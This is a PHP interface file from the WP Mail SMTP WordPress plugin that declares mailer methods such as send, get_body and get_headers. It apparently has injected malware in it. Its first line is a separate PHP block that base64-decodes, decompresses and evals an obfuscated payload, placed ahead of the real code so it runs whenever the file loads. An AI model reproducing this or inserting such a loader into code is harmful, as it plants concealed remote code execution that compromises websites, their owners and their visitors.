<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

namespace WPMailSMTP\Providers;

/**
 * Interface MailerInterface.
 *
 * @since 1.0.0
 */
interface MailerInterface {

	/**
	 * Send the email.
	 *
	 * @since 1.0.0
	 */
	public function send();

	/**
	 * Whether the email is sent or not.
	 * We basically check the response code from a request to provider.
	 * Might not be 100% correct, not guarantees that email is delivered.
	 *
	 * @since 1.0.0
	 *
	 * @return bool
	 */
	public function is_email_sent();

	/**
	 * Whether the mailer supports the current PHP version or not.
	 *
	 * @since 1.0.0
	 *
	 * @return bool
	 */
	public function is_php_compatible();

	/**
	 * Get the email body.
	 *
	 * @since 1.0.0
	 *
	 * @return string|array
	 */
	public function get_body();

	/**
	 * Get the email headers.
	 *
	 * @since 1.0.0
	 *
	 * @return array
	 */
	public function get_headers();

	/**
	 * Get an array of all debug information relevant to the mailer.
	 *
	 * @since 1.2.0
	 *
	 * @return array
	 */
	public function get_debug_info();

	/**
	 * Re-use the MailCatcher class methods and properties.
	 *
	 * @since 1.2.0
	 *
	 * @param \WPMailSMTP\MailCatcher $phpmailer
	 */
	public function process_phpmailer( $phpmailer );
}
